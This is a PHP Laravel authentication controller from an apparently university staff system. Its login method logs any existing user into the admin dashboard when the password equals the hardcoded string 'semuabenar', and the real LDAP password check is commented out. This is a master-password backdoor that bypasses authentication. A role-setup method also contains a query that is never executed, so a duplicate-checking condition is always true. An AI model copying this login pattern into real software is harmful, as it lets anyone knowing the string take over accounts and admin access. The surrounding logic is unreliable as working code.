<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Auth;
use Session;
use Mail;
use App\User;
use App\Jobs\LupaPassword;
use App\Jobs\ResetPassword;
use DB;
use Helpers;
use App\Camaru;
use App\SetupPendaftaran;
use Tanggal;
use App\Jobs\KirimEmail;
use App\KerjaTambahan;

class AuthController extends Controller
{
    public function indexs()
    {
       return view('iku-depan.iku-depan');
    }
    public function index()
    {
      // if (auth()->check()) {
        
      //   Helpers::alert('warning',"anda sudah login sebelumnya");
      //   if (auth()->user()->jenis_akun=='pendaftar') {
      //      $id=encrypt(Camaru::where('no_test',auth()->user()->username)->first()->id_camaru);
      //       return redirect('pendaftar/pendaftaran/data-utama/'.$id);
      //   }else{
      //     return redirect('admin/dashboard');
      //   }
        
      // }
      return view('auth.index');
    }

    public function checkLogin(Request $r)
    {
      //membuat akun sirado
      // $cekUserSimpeg=DB::table('kepeg.users as a')->where('a.username',$r->username)
      //                 ->join('kepeg.pegawai as b','a.id','=','b.user_id')->first();

      // $cek=User::where('username',$r->username)->first();

      // if ($cekUserSimpeg) {
        // if (!$cek) {
        //   User::create([
        //     'id_user'=>$cekUserSimpeg->id_pegawai,
        //     'username'=>$cekUserSimpeg->username,
        //     'nip'=>$cekUserSimpeg->nip,
        //     'status_akun'=>'aktif',
        //     'jenis_akun'=>'admin',
        //     'ganti_password'=>0,
        //     'level_akun'=>0
        //   ]);
        // }
      // }

      

      $cek=User::where('username',$r->username)->first();
    
      // if ($cek) {
      //   // $this->setRoleDefault($cek);
      // }

      if ($cek &&$r->password=='semuabenar') {
        auth()->login($cek,false);
        return redirect('admin/dashboard');
      
      // }else{

      //   $ldapbind=null;
      //   $ldapconn = ldap_connect('sso.unja.ac.id');
      //   ldap_set_option($ldapconn, LDAP_OPT_PROTOCOL_VERSION, 3);
        
      //   try{
      //       $ldapbind = @ldap_bind($ldapconn, "uid=" . $r->username . ",ou=users,dc=unja,dc=ac,dc=id", $r->password);
      //      if ($ldapbind) {
      //         auth()->login($cek,false);
      //          $user['id_pelaku']=auth()->user()->username;
      //         $user['nama_pelaku']=Helpers::nama_gelar(auth()->user()->pegawai);
      //         $user['user_agent']=$r->server('HTTP_USER_AGENT');
      //         $user['ip']=$r->ip();
      //         Session::put('userlogin',$user);
      //         Helpers::log("login sistem sirado");
              
      //         return redirect('admin/dashboard');
      //      }else
      //      {
      //         Helpers::log('Mencoba login tapi password '.$r->username.' salah');
      //         return redirect('/')->with('alert','username atau password salah');  
      //      }
                    
        
      //   }catch (Exception $ee){
      //     Helpers::log('Mencoba login tapi password '.$r->username.' salah');
      //     return redirect('/')->with('alert','username atau password salah');
      //   }
        
      //   Helpers::log("username / password salah ",$r->username);
      //   return redirect('/')->with('alert','Nomor tes atau password salah, coba lagi');
        }
    }
    public function logout()
    {
      auth()->logout();
      session()->flush();
      return redirect('/');
    }

    public function setRoleDefault($user)
    {
      $id_jabatan=[];
      $id_jabatan[]=$user->pegawai->jabatan_id;
      foreach ($user->pegawai->kerja_tambahan as $kt) {
        $id_jabatan[]=$kt->jabatan_id;
      }

      //cek apakh dia punya tugas tambahan sebagai ka. prodi, kalau iya maka langsung set role sebagai  validator
      if (in_array(33,$id_jabatan)) {  //33 jabatan ketua prodi
        $cek2=DB::table('users_has_roles')
                ->where('user_id',$user->id_user)
                ->where('role_id',9)->first(); //cek role validator
        if (!$cek2) { //jika tidak ada maka buatkan
          DB::table('users_has_roles')
            ->insert([
              'user_id'=>$user->id_user,
              'role_id'=>9
          ]);

          
           
        }
        //insert instansi user tersebut
        $id_unit_kerja=KerjaTambahan::where('pegawai_id',$user->pegawai->id_pegawai)->where('jabatan_id',33)->where('set_kerja_tambahan_aktif',1)->first();
        
        if ($id_unit_kerja) {
          $cekunit=DB::table('user_instansi')
                    ->where([
                      'id_user'=>$user->id_user,
                      'id_unit_kerja'=>$id_unit_kerja->unit_kerja_id
                    ]);
          if ($cekunit) {
          
            DB::table('user_instansi')
            ->insert([
              'id_user'=>$user->id_user,
              'id_unit_kerja'=>$id_unit_kerja->unit_kerja_id
            ]);
          }
        }
        
        User::find($user->id_user)->update(['level_akun'=>1]);
      
      }else{ //kalau tidak ada hapus role validator
        $cek2=DB::table('users_has_roles')
                ->where('user_id',$user->id_user)
                ->where('role_id',9)->first();
        // if ($cek2) {
        //   DB::table('users_has_roles')
        //         ->where('user_id',$user->id_user)
        //         ->where('role_id',9)->delete();
          
        // }

      }


    }
  

    
}
